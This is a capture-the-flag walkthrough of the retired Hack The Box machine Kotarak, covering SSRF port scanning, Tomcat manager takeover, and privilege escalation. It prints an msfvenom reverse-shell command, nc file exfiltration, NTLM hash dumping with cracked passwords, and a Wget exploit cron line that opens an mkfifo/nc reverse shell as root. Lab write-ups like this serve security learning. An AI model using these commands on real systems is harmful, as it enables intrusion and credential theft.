# Kotarak

This is the write-up for the box Kotarak that got retired at the 10th March 2018.
My IP address was 10.10.14.11 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.55    kotarak.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/kotarak.nmap 10.10.10.55
```

```markdown
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:d7:ca:0e:b7:cb:0a:51:f7:2e:75:ea:02:24:17:74 (RSA)
|   256 e8:f1:c0:d3:7d:9b:43:73:ad:37:3b:cb:e1:64:8e:e9 (ECDSA)
|_  256 6d:e9:26:ad:86:02:2d:68:e1:eb:ad:66:a0:60:17:b8 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods:
|   Supported methods: GET HEAD POST PUT DELETE OPTIONS
|   Potentially risky methods: PUT DELETE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
| http-methods:
|_  Potentially risky methods: PUT DELETE
|_http-title: Apache Tomcat/8.5.5 - Error report
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Full TCP port range scan:
```markdown
nmap -p- -o nmap/kotarak_allports.nmap 10.10.10.55
```

```markdown
PORT      STATE SERVICE
22/tcp    open  ssh
8009/tcp  open  ajp13
8080/tcp  open  http-proxy
60000/tcp open  unknown
```

## Checking HTTP (Port 60000)

On the web page on port 60000 we can allegedly browse the web:

![Web page port 60000](https://kyuu-ji.github.io/htb-write-up/kotarak/kotarak_web-1.png)

When entering a test string and submitting it, it forwards us to _/url.php?path=teststring_.
This looks like a **Server-Side Request Forgery (SSRF)** attack, where it could be possible to access parts of the server that should normally not be accessible.

Lets test this out by starting a **SimpleHTTPServer** with Python and submit the IP address of our machine:
```markdown
python -m SimpleHTTPServer 80
```

After submitting my local web server gets a connection and the directory listing is shown.

### Server-Side Request Forgery

Trying to display local files on the box by submitting:
```markdown
file:///etc/passwd
```

This outputs the text _"try harder"_ and it seems like it filters for the word "file" in all cases.
Sending this to **Burpsuite** and analyzing it more.

When requesting something from _localhost_ it responds the same page back:
```markdown
GET /url.php?path=http://localhost:60000 HTTP/1.1
```

This can be used to do a local port scan by fuzzing the port number with **Wfuzz**:
```markdown
wfuzz -c -z range,1-65535 --hl=2 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
```

This command tries out every number between 1 and 65535 at the end of the request and ignores all results that have only 2 characters because those are false positives.
The results are locally open ports on the box, but it is possible to access them as the tool on port 60000 allows us to request them.
```markdown
Open ports:
22, 90, 110, 200, 320, 888
```

Now request every single one as before with port 60000:
```markdown
- GET /url.php?path=http://localhost:90 HTTP/1.1
  - Title: _"This page is under construction"_
- GET /url.php?path=http://localhost:110 HTTP/1.1
  - Title: _"Test page"_
- GET /url.php?path=http://localhost:200 HTTP/1.1
  - Title: _"Hello World"_
- GET /url.php?path=http://localhost:320 HTTP/1.1
  - Title: _"Accounting"_
- GET /url.php?path=http://localhost:888 HTTP/1.1
  - Title: _"Simple File Viewer"_
```

The service on **port 320** could be interesting when finding credentials:

![SSRF on port 320](https://kyuu-ji.github.io/htb-write-up/kotarak/kotarak_web-2.png)

The service on **port 888** provides some files that could be useful:

![SSRF on port 888](https://kyuu-ji.github.io/htb-write-up/kotarak/kotarak_web-3.png)

To look up the files, they need to be appended on the URL:
```markdown
/url.php?path=http%3A%2F%2Flocalhost%3A888?doc=backup
```

The file _backup_ shows some configuration file from Tomcat with clear-text credentials:
```html
 <user username="admin" password="3@g01PdhB!" roles="manager,manager-gui,admin-gui,manager-script"/>
 ```

## Checking HTTP (Port 8080)

On the Apache Tomcat web page there is an **"HTTP Status 404" error** and nothing else.
Most Apache Tomcat servers have _/manager/html_ as a directory and this is password protected.

The gathered credentials work here and logged us in on the **Tomcat Web Application Manager** where it is possible to upload a **WAR file** that executes malicious code to give us a shell.

To create such a WAF file we will use **Msfvenom**:
```markdown
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.11 LPORT=80 -f war > rce.war
```

Uploading it to the server:

![Uploading WAR file](https://kyuu-ji.github.io/htb-write-up/kotarak/kotarak_web-4.png)

Now we start a listener on port 80 on our local client and start the _/rce_ application:
```markdown
nc -lvnp 80
```

The box connects to the listener on my IP and port 80 and starts a reverse shell as the user _tomcat_.

## Privilege Escalation

In the home directory _/home/tomcat_ there are two interesting files:
- /home/tomcat/to_archive/pentest_data/20170721114636_default_192.168.110.133_psexec.ntdsgrab.333512.dit
- /home/tomcat/to_archive/pentest_data/20170721114637_default_192.168.110.133_psexec.ntdsgrab.089134.bin

The fact that the folder is called _pentest_data_ and the files contain the terms _psexec_ and _ntdsgrab_ suggests that this is a **ntds.dit** database from a **Domain Controller** which contains all information about the domain including usernames, passwords, policies and so on.
With `file *` we can check what kind of file they are:
```markdown
...dit: data
...bin: MS Windows registry file, NT/2000 or above
```

Since this is data from a penetration test, it can be assumed that the **MS Windows Registry file** is the _SYSTEM_ hive file which contains the boot key that allows us to decrypt the _ntds.dit_.

Lets download the files to our local box:
```markdown
# On local client
nc -lvnp 443 > SYSTEM
nc -lvnp 443 > ntds.dit

# On box
nc 10.10.14.11 443 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab.089134.bin
nc 10.10.14.11 443 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab.333512.dit
```

Now lets start the decryption process.

### Decrypting the ntds.dit

To decrypt the _ntds.dit_ file, we use the **Impacket Framework**:
```markdown
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

After it finished, it outputs **NTLM hashes** of different users. The most important ones are:
```markdown
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
```

The hash of _krbtgt_ is probably too strong to crack, so lets ignore that.
Looking up if the other hashes are available online on **hashes.org**:
```markdown
e64fe0f24ba2489c05e64354d74ebd11:f16tomcat!
2b576acbe6bcfda7294d6bd18041b8fe:Password123!
```

They are and we got the clear-text passwords of both users.
These passwords don't work with SSH but as we are connected on the box, we can try to switch the user to _atanas_:
```markdown
su - atanas
```

The password of _Administrator_ works.

### Privilege Escalation to root

The home directory of _atanas_ doesn't have anything interesting in there but the user can go into the _/root_ folder and has permission to read two files:
- flag.txt
```markdown
Getting closer! But what you are looking for can't be found here.
```

- app.log
```markdown
10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
```

It looks like that **Wget 1.16** gets run every two minutes to the server _10.0.3.133_.
This is an old version of that tool so we look for vulnerabilities:
```markdown
searchsploit wget
```

The exploit called **"GNU Wget < 1.18 - Arbitrary File Upload / Remote Code Execution"** is the vulnerability to use.
To do this creating a _.wgetrc_ file on the box is necessary:
```markdown
cat <<_EOF_>.wgetrc
post_file = /etc/shadow
output_document = /etc/cron.d/wget-root-shell
_EOF_
```

Now starting an FTP service on the box with `authbind`:
```markdown
authbind python -m pyftpdlib -p21 -w
```

Create the Python script from the exploit description on the box and modify it accordingly:
```python
# (...)
HTTP_LISTEN_IP = '0.0.0.0'
HTTP_LISTEN_PORT = 80
FTP_HOST = '10.10.10.55'
FTP_PORT = 21

ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.11 9001 >/tmp/f \n"
# (...)
```

Execute the Python script with `authbind`:
```markdown
authbind python wget-exploit.py
```

After two minutes the _.wgetrc_ file gets uploaded on the FTP server in _/root_ and sends a redirect to ftp://anonymous@10.10.10.55/.wgetrc.
Another two minutes later it will execute the second request that will display the contents of the _/etc/shadow_ file and create the cronjob specified in the exploit script.

The listener on my IP and port 9001 starts a reverse shell as root on the other server 10.0.3.133!
